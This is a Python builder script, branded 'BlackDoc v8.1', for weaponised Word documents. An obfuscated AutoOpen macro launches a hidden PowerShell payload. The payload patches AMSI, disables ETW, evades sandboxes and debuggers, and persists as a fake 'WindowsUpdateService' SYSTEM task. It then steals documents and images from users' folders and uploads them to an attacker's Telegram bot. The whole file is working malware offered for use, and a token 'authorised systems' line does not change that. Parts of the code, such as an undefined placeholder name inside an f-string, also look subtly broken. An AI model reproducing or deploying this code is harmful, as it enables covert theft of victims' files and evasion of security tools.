#!/usr/bin/env python3
import os
import sys
import base64
import random
import string

def get_inputs():
    docx_path = input("Path to clean .docx file: ").strip()
    if not os.path.exists(docx_path):
        print("[-] File not found.")
        sys.exit(1)
    token = input("Telegram Bot Token: ").strip()
    chat_id = input("Telegram Chat ID: ").strip()
    if not token or not chat_id:
        print("[-] Token and Chat ID required.")
        sys.exit(1)
    return docx_path, token, chat_id

def xor_encrypt(data, key):
    return ''.join(chr(ord(c) ^ key) for c in data)

def xor_decrypt_func(key):
    return f"""
function Decrypt($enc, $key) {{
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($enc)
    for ($i=0; $i -lt $bytes.Length; $i++) {{ $bytes[$i] = $bytes[$i] -bxor $key }}
    return [System.Text.Encoding]::UTF8.GetString($bytes)
}}
"""

def generate_core_payload(token, chat_id, xor_key):
    token_xor = xor_encrypt(token, xor_key)
    chat_xor = xor_encrypt(chat_id, xor_key)
    var = [''.join(random.choices(string.ascii_letters, k=10)) for _ in range(14)]
    v_drives, v_exts, v_files, v_zip, v_boundary, v_body, v_batch, v_idx, v_chunk, v_part, v_filebytes, v_file = var[:12]
    core = f"""
# === AMSI Bypass (P/Invoke) ===
$code = @'
using System;
using System.Runtime.InteropServices;
using System.Reflection;

public class AmsiBypassPS {{
    [DllImport("kernel32.dll")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
    [DllImport("kernel32.dll")] static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
    [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
    [DllImport("kernel32.dll")] static extern IntPtr LoadLibrary(string n);

    public static int Bypass() {{
        IntPtr amsi = GetModuleHandle("amsi.dll");
        if (amsi == IntPtr.Zero) {{ amsi = LoadLibrary("amsi.dll"); }}
        if (amsi == IntPtr.Zero) {{ return -1; }}

        byte[] patch = IntPtr.Size == 8
            ? new byte[] {{ 0x31, 0xC0, 0xC3 }}
            : new byte[] {{ 0x31, 0xC0, 0xC2, 0x18, 0x00 }};

        int count = 0;
        foreach (var fn in new[] {{ "AmsiScanBuffer", "AmsiOpenSession", "AmsiScanString" }}) {{
            IntPtr a = GetProcAddress(amsi, fn);
            if (a != IntPtr.Zero) {{
                uint o, w;
                VirtualProtect(a, (uint)patch.Length, 0x40, out o);
                WriteProcessMemory(GetCurrentProcess(), a, patch, (uint)patch.Length, out w);
                VirtualProtect(a, (uint)patch.Length, o, out o);
                count++;
            }}
        }}

        try {{
            var t = Assembly.Load("System.Management.Automation")
                .GetType("System.Management.Automation.AmsiUtils");
            if (t != null) {{
                var f = t.GetField("amsiInitFailed",
                    BindingFlags.NonPublic | BindingFlags.Static);
                if (f != null) {{ f.SetValue(null, true); }}
            }}
        }} catch {{ }}
        return count;
    }}
}}
'@
Add-Type -TypeDefinition $code
[void][AmsiBypassPS]::Bypass()

# === ETW Bypass ===
try {{
    $etw = [Ref].Assembly.GetType('System.Management.Automation.Internal.PSConsoleHostBinder')
    if ($etw) {{ $etw.GetField('etwEnabled','NonPublic,Static').SetValue($null,$false) }}
}} catch {{ }}

# === Anti‑Debug & Anti‑Sandbox ===
if ([System.Diagnostics.Debugger]::IsAttached) {{ exit }}
$ram = (Get-WmiObject Win32_ComputerSystem -ErrorAction SilentlyContinue).TotalPhysicalMemory / 1GB
$cores = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Measure-Object -Property NumberOfCores -Sum).Sum
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue).LastBootUpTime
if ($ram -lt 4 -or $cores -lt 2 -or $uptime.TotalMinutes -lt 30) {{ exit }}

# === Decrypt Credentials ===
{xor_decrypt_func(xor_key)}
$token = Decrypt "{token_xor}" {xor_key}
$chatId = Decrypt "{chat_xor}" {xor_key}

# === Persistence (Scheduled Task) ===
$taskName = "WindowsUpdateService" + (Get-Random -Max 999)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -EncodedCommand {payload_b64_placeholder}"
$trigger = New-ScheduledTaskTrigger -Daily -At (Get-Date).AddHours(1)
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Description "System Maintenance" -User "SYSTEM" -RunLevel Highest -Force

# === Spawn hidden process (same payload) ===
Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoP -NonI -Exec Bypass -EncodedCommand {payload_b64_placeholder}"

# === Scan All Drives ===
${v_drives} = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=3" | ForEach-Object {{ $_.DeviceID }}
${v_exts} = @('.docx','.xlsx','.pdf','.txt','.ppt','.doc','.pptx','.xls','.csv','.rtf','.odt','.ods','.jpg','.jpeg','.png','.gif','.bmp','.tiff')
${v_files} = @()
$excludeDirs = @('Windows','Program Files','Program Files (x86)','System32','AppData')
foreach ($drive in ${v_drives}) {{
    $searchPaths = @(
        "$drive\\Users\\*\\Documents",
        "$drive\\Users\\*\\Desktop",
        "$drive\\Users\\*\\Downloads",
        "$drive\\Users\\*\\OneDrive",
        "$drive\\Users\\*\\Pictures"
    )
    foreach ($path in $searchPaths) {{
        if (Test-Path $path) {{
            Get-ChildItem -Path $path -File -Recurse -ErrorAction SilentlyContinue | Where-Object {{
                $_.DirectoryName -notmatch ($excludeDirs -join '|')
            }} | ForEach-Object {{
                if (${v_exts} -contains $_.Extension.ToLower()) {{
                    ${v_files} += @{{ Name = $_.Name; Path = $_.FullName; Size = $_.Length }}
                }}
            }}
        }}
    }}
}}
if (${v_files}.Count -eq 0) {{ exit }}
${v_files} = ${v_files} | Sort-Object -Property Size -Descending
Add-Type -AssemblyName System.IO.Compression.FileSystem

function Send-File {{
    param($fileBytes, $fileName, $chatId, $token)
    $boundary = "---------------------------" + ([System.Guid]::NewGuid().ToString().Replace("-", ""))
    $contentType = "multipart/form-data; boundary=$boundary"
    $body = New-Object System.Text.StringBuilder
    $body.AppendLine("--$boundary")
    $body.AppendLine('Content-Disposition: form-data; name="chat_id"')
    $body.AppendLine()
    $body.AppendLine($chatId)
    $body.AppendLine("--$boundary")
    $body.AppendLine('Content-Disposition: form-data; name="document"; filename="' + $fileName + '"')
    $body.AppendLine('Content-Type: application/octet-stream')
    $body.AppendLine()
    $textPart = $body.ToString()
    $textBytes = [System.Text.Encoding]::UTF8.GetBytes($textPart)
    $endBoundary = "`r`n--$boundary--`r`n"
    $endBytes = [System.Text.Encoding]::UTF8.GetBytes($endBoundary)
    $totalLength = $textBytes.Length + $fileBytes.Length + $endBytes.Length
    $requestBytes = New-Object byte[] $totalLength
    [System.Array]::Copy($textBytes, 0, $requestBytes, 0, $textBytes.Length)
    [System.Array]::Copy($fileBytes, 0, $requestBytes, $textBytes.Length, $fileBytes.Length)
    [System.Array]::Copy($endBytes, 0, $requestBytes, $textBytes.Length + $fileBytes.Length, $endBytes.Length)
    $url = "https://api.telegram.org/bot$token/sendDocument"
    $headers = @{{ "Content-Type" = $contentType }}
    try {{
        Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $requestBytes -ErrorAction Stop
        Start-Sleep -Seconds 1
    }} catch {{ }}
}}

function Send-Message {{
    param($text, $chatId, $token)
    $url = "https://api.telegram.org/bot$token/sendMessage"
    $body = @{{ chat_id = $chatId; text = $text }} | ConvertTo-Json
    try {{
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop
        Start-Sleep -Seconds 1
    }} catch {{ }}
}}

# === Batch & Exfil ===
${v_batch} = 1
${v_idx} = 0
while (${v_idx} -lt ${v_files}.Count) {{
    ${v_file} = ${v_files}[${v_idx}]
    if (${v_file}.Size -gt 50MB) {{
        ${v_filebytes} = [System.IO.File]::ReadAllBytes(${v_file}.Path)
        ${v_chunk} = 10MB
        ${v_part} = 1
        $offset = 0
        while ($offset -lt ${v_filebytes}.Length) {{
            $chunkSize = [Math]::Min(${v_chunk}, ${v_filebytes}.Length - $offset)
            $chunkBytes = New-Object byte[] $chunkSize
            [System.Array]::Copy(${v_filebytes}, $offset, $chunkBytes, 0, $chunkSize)
            $chunkName = $(${v_file}.Name) + "_part" + ${v_part} + ".bin"
            Send-File $chunkBytes $chunkName $chatId $token
            $offset += $chunkSize
            ${v_part}++
        }}
        # Send summary message with reassembly instructions
        $summary = "📁 File: $(${v_file}.Name)`n📦 Size: $(${v_file}.Size) bytes`n🧩 Parts: $(${v_part}-1) chunks of 10MB`n🔗 Reassemble: cat part* > $(${v_file}.Name) (Linux) or copy /b part*.bin $(${v_file}.Name) (Windows)"
        Send-Message $summary $chatId $token
        ${v_idx}++
        continue
    }}
    ${v_zip} = New-Object System.IO.MemoryStream
    $zipArchive = [System.IO.Compression.ZipArchive]::new(${v_zip}, 'Create')
    $currentSize = 0
    while (${v_idx} -lt ${v_files}.Count) {{
        ${v_file} = ${v_files}[${v_idx}]
        if (${v_file}.Size -gt 50MB) {{ break }}
        if ($currentSize + ${v_file}.Size -gt 50MB) {{ break }}
        $entry = $zipArchive.CreateEntry(${v_file}.Name)
        $entryStream = $entry.Open()
        $fileBytes = [System.IO.File]::ReadAllBytes(${v_file}.Path)
        $entryStream.Write($fileBytes, 0, $fileBytes.Length)
        $entryStream.Close()
        $currentSize += ${v_file}.Size
        ${v_idx}++
    }}
    $zipArchive.Dispose()
    ${v_zip}.Seek(0, 'Begin')
    $fileBytes = ${v_zip}.ToArray()
    ${v_zip}.Close()
    $zipName = "docs_batch_" + ${v_batch} + ".zip"
    Send-File $fileBytes $zipName $chatId $token
    ${v_batch}++
}}
"""
    return core

def generate_obfuscated_vba(payload_b64):
    chunks = []
    i = 0
    while i < len(payload_b64):
        chunk_size = random.randint(40, 80)
        chunks.append(payload_b64[i:i+chunk_size])
        i += chunk_size
    b64_concat = " & _\n    ".join([f'"{ch}"' for ch in chunks])
    f1 = ''.join(random.choices(string.ascii_letters, k=6))
    v1 = ''.join(random.choices(string.ascii_letters, k=6))
    v2 = ''.join(random.choices(string.ascii_letters, k=6))
    vba = f"""
Private Function {f1}() As String
    {f1} = {b64_concat}
End Function
Sub AutoOpen()
    Dim {v1} As String
    {v1} = {f1}
    Dim {v2} As String
    {v2} = "pow" & "ersh" & "ell" & " -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand " & {v1}
    Shell {v2}, 0
End Sub
"""
    return vba

def inject_macro_into_docx(input_docx, output_docm, vba_code):
    try:
        import win32com.client as win32
        from win32com.client import constants
    except ImportError:
        print("[-] pywin32 not installed. Install: pip install pywin32")
        print("\n--- VBA CODE (copy manually) ---")
        print(vba_code)
        print("---------------------------------")
        sys.exit(1)
    word = win32.gencache.EnsureDispatch('Word.Application')
    word.Visible = False
    doc = word.Documents.Open(input_docx)
    vba_project = doc.VBProject
    module = vba_project.VBComponents.Add(1)
    module.CodeModule.AddFromString(vba_code)
    output_path = os.path.join(os.getcwd(), output_docm)
    doc.SaveAs2(FileName=output_path, FileFormat=constants.wdFormatXMLDocumentMacroEnabled)
    doc.Close()
    word.Quit()
    print(f"[+] BlackDoc saved as: {output_path}")

def main():
    print(r"""
   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
  ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌
  ▐░▌          ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
  ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌
  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
   ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌
            ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌
   ▄▄▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌
  ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌
   ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀ 
          BLACKDOC v8.1 – with Reassembly Summary
    """)
    docx_path, token, chat_id = get_inputs()
    xor_key = random.randint(1, 255)
    core_script = generate_core_payload(token, chat_id, xor_key)
    # Insert the core's own base64 into the placeholder for persistence
    core_bytes = core_script.encode('utf-16le')
    core_b64 = base64.b64encode(core_bytes).decode('ascii')
    # Replace the placeholder in the core script with itself
    core_script_final = core_script.replace("{payload_b64_placeholder}", core_b64)
    # Re-encode the final script
    core_bytes_final = core_script_final.encode('utf-16le')
    core_b64_final = base64.b64encode(core_bytes_final).decode('ascii')
    vba_code = generate_obfuscated_vba(core_b64_final)
    output_file = "BlackDoc.docm"
    inject_macro_into_docx(docx_path, output_file, vba_code)
    print("\n[+] BlackDoc v8.1 generated.")
    print("[!] On Windows: AMSI patched, ETW disabled, anti‑sandbox, persistence with evasion.")
    print("[!] Scans all drives, batches ZIPs >50MB, splits large files with summary messages.")
    print("[!] Use only on authorised systems.")

if __name__ == "__main__":
    main()
